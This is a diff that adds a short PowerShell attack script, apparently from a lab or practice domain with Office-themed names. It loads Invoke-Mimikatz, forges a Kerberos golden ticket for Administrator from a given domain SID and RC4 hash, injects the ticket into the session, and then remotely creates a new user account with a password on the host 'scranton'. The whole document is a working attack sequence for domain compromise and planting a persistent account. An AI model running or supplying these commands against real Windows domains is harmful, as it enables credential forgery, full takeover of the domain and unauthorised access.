@@ -1,0 +1,5 @@
+klist purge;
+. .\Invoke-Mimikatz.ps1;
+invoke-mimikatz -command "kerberos::golden /domain:domain /sid:S-1-5-21-1004336348-1177238915-682003330-512  /rc4:855c3697d9979e78ac404c4ba2c66533 /user:Administrator /ptt";
+klist;
+invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
